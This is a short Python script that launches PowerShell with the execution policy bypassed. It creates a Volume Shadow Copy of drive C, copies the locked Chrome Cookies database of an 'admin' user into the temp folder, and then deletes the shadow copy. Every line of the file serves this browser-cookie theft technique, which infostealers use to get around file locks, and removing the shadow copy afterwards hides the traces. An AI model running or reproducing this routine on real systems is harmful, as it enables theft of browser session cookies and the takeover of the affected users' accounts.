"""Attempt VSS snapshot to copy locked Chrome Cookies."""
from __future__ import annotations

import subprocess
import tempfile
from pathlib import Path

ps = r"""
$ErrorActionPreference = 'Stop'
$class = Get-CimClass -ClassName Win32_ShadowCopy
$result = Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\'; Context='ClientAccessible'}
Write-Output ("ReturnValue=" + $result.ReturnValue)
Write-Output ("ShadowID=" + $result.ShadowID)
if ($result.ReturnValue -eq 0) {
  $shadow = Get-CimInstance Win32_ShadowCopy | Where-Object { $_.ID -eq $result.ShadowID }
  Write-Output ("DeviceObject=" + $shadow.DeviceObject)
  $src = $shadow.DeviceObject + '\Users\admin\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'
  $dst = $env:TEMP + '\vss_cookies_copy'
  Copy-Item -LiteralPath $src -Destination $dst -Force
  Write-Output ("CopiedTo=" + $dst)
  Write-Output ("Size=" + (Get-Item $dst).Length)
  # delete shadow
  $shadow | Remove-CimInstance
  Write-Output 'ShadowRemoved'
}
"""

r = subprocess.run(
    ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
    capture_output=True,
    text=True,
)
print("code", r.returncode)
print("STDOUT:\n", r.stdout)
print("STDERR:\n", r.stderr)
